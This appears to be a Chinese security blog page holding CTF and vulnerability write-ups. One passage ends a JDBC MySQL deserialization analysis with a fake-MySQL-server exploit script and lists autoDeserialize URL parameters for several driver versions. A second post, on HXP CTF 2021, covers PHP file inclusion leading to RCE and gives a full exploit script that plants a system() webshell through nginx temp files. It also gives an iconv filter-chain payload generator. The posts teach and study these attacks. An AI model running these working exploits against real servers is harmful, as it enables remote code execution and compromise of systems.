对应第一个问候数据包，当监听到连接之后，发送给客户端</span><br><span class="line">GreetingInfo = &quot;4a0000000a382e302e31320013000000080c16437d1a144000ffffc00200ffc31500000000000000000000203c5f03322d4f4863566101006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br><span class="line"></span><br><span class="line">login1 = &quot;0700000200000002000000&quot;</span><br><span class="line"></span><br><span class="line"># 用户发送账号和密码后，验证成功的返回数据包</span><br><span class="line">loginValid = &quot;01000001122e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000f036465660000000873716c5f6d6f6465000c21005f010000fd00001f000026000010036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000011036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001203646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000013036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f9000014013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690f757466385f67656e6572616c5f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce40653595354454d0f52455045415441424c452d524541440331323007000015fe000002000000&quot;</span><br><span class="line"></span><br><span class="line">resCharset = &quot;0700000100000002000000&quot;</span><br><span class="line"></span><br><span class="line">resAutoCommit = &quot;01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000&quot;</span><br><span class="line"></span><br><span class="line"># show session status返回值构造</span><br><span class="line">part1 = &quot;0100000102&quot;</span><br><span class="line"># part2 = &quot;4c00000203646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730d5661726961626c655f6e616d650d5661726961626c655f6e616d650cff0000010000fd0110000000&quot;</span><br><span class="line">part2 = &quot;2a00000203646566047465737404746573740474657374046e616d65046e616d650c3f00ffff0000fc9000000000&quot;</span><br><span class="line">part3 = &quot;2c000003036465660474657374047465737404746573740576616c75650576616c75650c3f00ffff0000fc9000000000&quot;</span><br><span class="line"></span><br><span class="line"># part4就是我们想要构造部分，主要需要修改前三个字节、第5个字节以及中间的41626f727465645f636c69656e7473这个部分</span><br><span class="line"># 第五个字节表示构造字符串的长度，前三个字节表示的长度从第5个字节开始算起</span><br><span class="line">with open(&quot;poc&quot;,&quot;rb&quot;) as file:</span><br><span class="line">    payload = binascii.b2a_hex(file.read())</span><br><span class="line">tmpPart4 = &quot;120000040f41626f727465645f636c69656e74730139&quot;</span><br><span class="line"></span><br><span class="line">part4 = &quot;220800&quot; + &quot;04&quot; + &quot;fc1d08&quot; + payload.decode(&#x27;utf-8&#x27;) + &quot;0139&quot;</span><br><span class="line"></span><br><span class="line">part5 = &quot;07000005fe000022000100&quot;</span><br><span class="line">resPayload = part1 + part2 + part3 + part4 + part5</span><br><span class="line"></span><br><span class="line">final = &quot;0700000100000002000000&quot;</span><br><span class="line"></span><br><span class="line">warn = &quot;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&quot;</span><br><span class="line">def startServer():</span><br><span class="line">    serverSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">    serverSocket.bind((&quot;0.0.0.0&quot;,3306))</span><br><span class="line">    serverSocket.listen(1)</span><br><span class="line">    print(&quot;Start Fake Server:&#123;&#125;:&#123;&#125;&quot;.format(&quot;0.0.0.0&quot;,&quot;3306&quot;))</span><br><span class="line">    while True:</span><br><span class="line">        # 获取到数据之后，开始进行交互</span><br><span class="line">        conn,addr = serverSocket.accept()</span><br><span class="line"></span><br><span class="line">        conn.send(binascii.a2b_hex(GreetingInfo))</span><br><span class="line">        while True:</span><br><span class="line">            data = conn.recv(1024)</span><br><span class="line">            print(&quot;接收到数据：&#123;&#125;&quot;.format(data))</span><br><span class="line">            # login验证</span><br><span class="line">            if b&quot;mysql_native_password&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(login1))</span><br><span class="line">            elif b&quot;auto_increment_increment&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(loginValid))</span><br><span class="line">            elif b&quot;character_set_results&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resCharset))</span><br><span class="line">            elif b&quot;session.autocommit&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resAutoCommit))</span><br><span class="line">            elif b&quot;SHOW SESSION STATUS&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resPayload))</span><br><span class="line">            elif b&quot;AUTO&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(final))</span><br><span class="line">            elif b&quot;WARNINGS&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(warn))</span><br><span class="line"></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    startServer()</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113212542880.png" alt="image-20220113212542880"></p>
<h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>​    本文主要分析了<code>mysql8.x</code>环境下的反序列化漏洞的利用，漏洞利用点就在于<code>jdbc</code>的<code>URL</code>可控，然后我们构造<code>autoDeserialize</code>和<code>queryInterceptors</code>，让其远程连接<code>Fake Mysql</code>，最终触发了反序列化。本文用到的<code>URL</code>为：<code>jdbc:mysql://127.0.0.1:3306/test?useSSL=false&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;serverTimezone=UTC</code>。这里设置<code>useSSL=false</code>主要是为了方便抓取<code>mysql</code>数据包进行分析。</p>
<p>​    当然，在不同的<code>mysql</code>版本下，利用的方式稍微有一点点不同，但是大致原理是类似，这里就不再进行分析了。下面贴一个不同版本下<code>jdbc</code>反序列化漏洞的利用方式：（有兴趣的师傅自己研究吧）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 6.x版本下需要设置的参数</span><br><span class="line">autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br><span class="line"></span><br><span class="line"># 5.1.11及以上的5.x版本</span><br><span class="line">autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</span><br><span class="line"></span><br><span class="line"># 5.1.29-5.1.40</span><br><span class="line">detectCustomCollations=true&amp;autoDeserialize=true</span><br><span class="line"></span><br><span class="line"># 5.1.28-5.1.19</span><br><span class="line">autoDeserialize=true</span><br></pre></td></tr></table></figure>

<h2 id="六、参考文章"><a href="#六、参考文章" class="headerlink" title="六、参考文章"></a>六、参考文章</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/01/13/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&POC%E7%BC%96%E5%86%99/" data-id="cl8h223i70009b3dphbeecwz2" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-HXP CTF 2021文件包含到RCE技巧学习" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/01/07/HXP%20CTF%202021%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B0RCE%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/" class="article-date">
  <time datetime="2022-01-07T02:48:26.000Z" itemprop="datePublished">2022-01-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/01/07/HXP%20CTF%202021%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B0RCE%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/">HXP CTF 2021文件包含到RCE技巧学习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="HXP-CTF-2021-文件包含到RCE技巧学习"><a href="#HXP-CTF-2021-文件包含到RCE技巧学习" class="headerlink" title="HXP CTF 2021 文件包含到RCE技巧学习"></a><code>HXP CTF 2021</code> 文件包含到<code>RCE</code>技巧学习</h1><p>​    最新看到两个通过文件包含来<code>RCE</code>的题目，感觉挺有意思的。继<code>pearcmd</code>后的另外一种利用方式。简单记录一下。</p>
<h2 id="Trick-1：Nginx客户端主体缓冲区利用"><a href="#Trick-1：Nginx客户端主体缓冲区利用" class="headerlink" title="Trick 1：Nginx客户端主体缓冲区利用"></a>Trick 1：<code>Nginx</code>客户端主体缓冲区利用</h2><p>源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include_once($_GET[&#x27;file&#x27;]);</span><br></pre></td></tr></table></figure>

<p>​    利用<code>Nginx</code>提供了一个客户端主体缓冲区，如果客户端主体信息超过了某个阈值的话，<code>Nginx</code>会将全部主体或者部分主体写入到一个临时文件里面。如果<code>Nginx</code>和<code>PHP</code>以相同的用户身份进行运行的话，就可以利用此方式来上传文件，从而达到<code>RCE</code>的目的。</p>
<p>​    官方解释：<code>https://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Syntax:	client_body_buffer_size size;</span><br><span class="line">Default:	client_body_buffer_size 8k|16k;</span><br><span class="line">Context:	http, server, location</span><br><span class="line"></span><br><span class="line">Sets buffer size for reading client request body. In case the request body is larger than the buffer, the whole body or only its part is written to a temporary file. By default, buffer size is equal to two memory pages. This is 8K on x86, other 32-bit platforms, and x86-64. It is usually 16K on other 64-bit platforms.</span><br></pre></td></tr></table></figure>

<p>​    相关的<code>Nginx</code>的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ngx_open_tempfile(u_char *name, ngx_uint_t persistent, ngx_uint_t access)</span><br><span class="line">&#123;</span><br><span class="line">    ngx_fd_t  fd;</span><br><span class="line"></span><br><span class="line">    fd = open((const char *) name, O_CREAT|O_EXCL|O_RDWR,</span><br><span class="line">              access ? access : 0600);</span><br><span class="line"></span><br><span class="line">    if (fd != -1 &amp;&amp; !persistent) &#123;</span><br><span class="line">        (void) unlink((const char *) name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    可以发现<code>open</code>了一个文件，然后利用<code>unlink</code>又将文件删除掉。所以，这里存在一个利用方式就是条件竞争。在<code>Linux</code>环境下，我们可以利用<code>procfs</code>来获取一个已被删除文件的引用。</p>
<p>​    在<code>PHP</code>环境下，利用<code>include</code>函数直接包含<code>/proc/23/fd</code>这种文件，会显示解析的文件不存在路径中，可以利用<code>/proc/self/fd/23/../../../23/fd/</code>这种方式来进行绕过。</p>
<p>​    <code>poc.py</code>代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import sys, threading, requests</span><br><span class="line"></span><br><span class="line"># exploit PHP local file inclusion (LFI) via nginx assistance (client body buffering)</span><br><span class="line"># see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details</span><br><span class="line"></span><br><span class="line">URL = f&#x27;http://&#123;sys.argv[1]&#125;:&#123;sys.argv[2]&#125;/&#x27;</span><br><span class="line"></span><br><span class="line"># find nginx worker processes</span><br><span class="line">r  = requests.get(URL, params=&#123;</span><br><span class="line">    &#x27;file&#x27;: &#x27;/proc/cpuinfo&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">cpus = r.text.count(&#x27;processor&#x27;)</span><br><span class="line"></span><br><span class="line">r  = requests.get(URL, params=&#123;</span><br><span class="line">    &#x27;file&#x27;: &#x27;/proc/sys/kernel/pid_max&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">pid_max = int(r.text)</span><br><span class="line">print(f&#x27;[*] cpus: &#123;cpus&#125;; pid_max: &#123;pid_max&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">nginx_workers = []</span><br><span class="line">for pid in range(pid_max):</span><br><span class="line">    r  = requests.get(URL, params=&#123;</span><br><span class="line">        &#x27;file&#x27;: f&#x27;/proc/&#123;pid&#125;/cmdline&#x27;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    if b&#x27;nginx: worker process&#x27; in r.content:</span><br><span class="line">        print(f&#x27;[*] nginx worker found: &#123;pid&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">        nginx_workers.append(pid)</span><br><span class="line">        if len(nginx_workers) &gt;= cpus:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">done = False</span><br><span class="line"></span><br><span class="line"># upload a big client body to force nginx to create a /var/lib/nginx/body/$X</span><br><span class="line">def uploader():</span><br><span class="line">    print(&#x27;[+] starting uploader&#x27;)</span><br><span class="line">    while not done:</span><br><span class="line">        requests.get(URL, data=&#x27;&lt;?php system($_GET[&quot;c&quot;]); /*&#x27; + 16*1024*&#x27;A&#x27;)</span><br><span class="line"></span><br><span class="line">for _ in range(16):</span><br><span class="line">    t = threading.Thread(target=uploader)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"># brute force nginx&#x27;s fds to include body files via procfs</span><br><span class="line"># use ../../ to bypass include&#x27;s readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`</span><br><span class="line">def bruter(pid):</span><br><span class="line">    global done</span><br><span class="line"></span><br><span class="line">    while not done:</span><br><span class="line">        print(f&#x27;[+] brute loop restarted: &#123;pid&#125;&#x27;)</span><br><span class="line">        for fd in range(4, 32):</span><br><span class="line">            f = f&#x27;/proc/self/fd/&#123;pid&#125;/../../../&#123;pid&#125;/fd/&#123;fd&#125;&#x27;</span><br><span class="line">            r  = requests.get(URL, params=&#123;</span><br><span class="line">                &#x27;file&#x27;: f,</span><br><span class="line">                &#x27;c&#x27;: f&#x27;id&#x27;</span><br><span class="line">            &#125;)</span><br><span class="line">            if r.text:</span><br><span class="line">                print(f&#x27;[!] &#123;f&#125;: &#123;r.text&#125;&#x27;)</span><br><span class="line">                done = True</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">for pid in nginx_workers:</span><br><span class="line">    a = threading.Thread(target=bruter, args=(pid, ))</span><br><span class="line">    a.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>![image-20220105144508328](HXP CTF 2021 文件包含赛题复现.assets/image-20220105144508328.png)</p>
<h2 id="Trick-2：iconv编码转换利用"><a href="#Trick-2：iconv编码转换利用" class="headerlink" title="Trick 2：iconv编码转换利用"></a>Trick 2：<code>iconv</code>编码转换利用</h2><p>​    除了直接使用上面的方式进行利用以外，还可以考虑利用伪协议的方式进行利用。在<code>PHP filter</code>过滤器中，有<code>iconv</code>的一个过滤器，它可以将数据从一种编码转换到另外一种编码，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;php://filter/convert.iconv.UTF-8.UTF-7/resource=data:,asdasda&lt;&gt;asd&quot;;</span><br><span class="line">echo file_get_contents($url);</span><br></pre></td></tr></table></figure>

<p>​        在<code>Linux</code>环境下，我们可以通过<code>iconv -l</code>命令来查看支持的字符集。</p>
<p>![image-20220107093125710](HXP CTF 2021 文件包含赛题复现.assets/image-20220107093125710.png)</p>
<p>​    其中有一个特殊的编码<code>UTF8.CSISO2022KR</code>，他几乎可以在任何一个字符串前面都增加一串前缀<code>.$)C</code>，例如下面这个示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;php://filter/&quot;;</span><br><span class="line">$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;</span><br><span class="line">$url .= &quot;|convert.base64-decode|convert.base64-encode&quot;;</span><br><span class="line">$url .= &quot;/resource=data://,aaa&quot;;</span><br><span class="line">var_dump(file_get_contents($url));</span><br></pre></td></tr></table></figure>

<p>​    输出的结果为<code>Caaaa</code>，稍微解释一下就是<code>base64-decode</code>会去除掉不合法的字符（不合法是相对<code>base64</code>编码来说的），当我们通过<code>iconv</code>转码之后，会变成有<code>.$)Caaaa</code>，然后利用<code>base64-decode</code>除掉前面三个不合法字符，再<code>encode</code>一下，就看获取到<code>Caaaa</code>。</p>
<p>​    利用这种方式来进行<code>RCE</code>的一个思路就是利用不同的编码组合和<code>base64-decode</code>的特性，来构造一串恶意字符。下面贴一个<code>payload</code>脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$base64_payload = &quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;;</span><br><span class="line">$conversions = array(</span><br><span class="line">    &#x27;R&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;,</span><br><span class="line">    &#x27;B&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;,</span><br><span class="line">    &#x27;C&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR&#x27;,</span><br><span class="line">    &#x27;8&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;,</span><br><span class="line">    &#x27;9&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;,</span><br><span class="line">    &#x27;f&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;,</span><br><span class="line">    &#x27;s&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;,</span><br><span class="line">    &#x27;z&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;,</span><br><span class="line">    &#x27;U&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;,</span><br><span class="line">    &#x27;P&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;,</span><br><span class="line">    &#x27;V&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;,</span><br><span class="line">    &#x27;0&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;,</span><br><span class="line">    &#x27;Y&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;,</span><br><span class="line">    &#x27;W&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;,</span><br><span class="line">    &#x27;d&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;,</span><br><span class="line">    &#x27;D&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;,</span><br><span class="line">    &#x27;7&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;,</span><br><span class="line">    &#x27;4&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$filters = &quot;convert.base64-encode|&quot;;</span><br><span class="line"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br><span class="line">$filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class="line"></span><br><span class="line">foreach (str_split(strrev($base64_payload)) as $c) &#123;</span><br><span class="line">    $filters .= $conversions[$c] . &quot;|&quot;;</span><br><span class="line">    $filters .= &quot;convert.base64-decode|&quot;;</span><br><span class="line">    $filters .= &quot;convert.base64-encode|&quot;;</span><br><span class="line">    $filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$filters .= &quot;convert.base64-decode&quot;;</span><br><span class="line"></span><br><span class="line">$final_payload = &quot;php://filter/&#123;$filters&#125;/resource=data://,aaaaa&quot;;</span><br><span class="line"></span><br><span class="line">// echo $final_payload;</span><br><span class="line">var_dump(file_get_contents($final_payload));</span><br></pre></td></tr></table></figure>

<p>​    仔细看一下脚本内容，可以发现我们是从后往前进行解析的，通过不断地拼接，<code>decode</code>最后就可以构造恶意<code>payload</code>。</p>
<p>​    但是该方式存在一定的局限性，我在两台不同的<code>Linux</code>主机上进行尝试，都没有成功。这应该是编码的问题，下面有师傅写的<code>fuzz</code>脚本，建议在利用这个技巧的时候，在与目标相同环境下，运行一下<code>fuzz</code>脚本，来获取特定的组合：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/blob/main/fuzzer.php">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/blob/main/fuzzer.php</a></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://bierbaumer.net/security/php-lfi-with-nginx-assistance/">https://bierbaumer.net/security/php-lfi-with-nginx-assistance/</a></p>
<p><a target="_blank" rel="noopener" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p>
<p><a target="_blank" rel="noopener" href="https://gynvael.coldwind.pl/?id=671">https://gynvael.coldwind.pl/?id=671</a></p>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/01/07/HXP%20CTF%202021%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B0RCE%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/" data-id="cl8h223hm0001b3dpgm5w14fx" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-前端安全---湖湘杯2021-Pastebin复现学习" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---%E6%B9%96%E6%B9%98%E6%9D%AF2021-Pastebin%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/" class="article-date">
  <time datetime="2021-12-23T03:38:34.000Z" itemprop="datePublished">2021-12-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---%E6%B9%96%E6%B9%98%E6%9D%AF2021-Pastebin%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/">前端安全---湖湘杯2021-Pastebin复现学习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
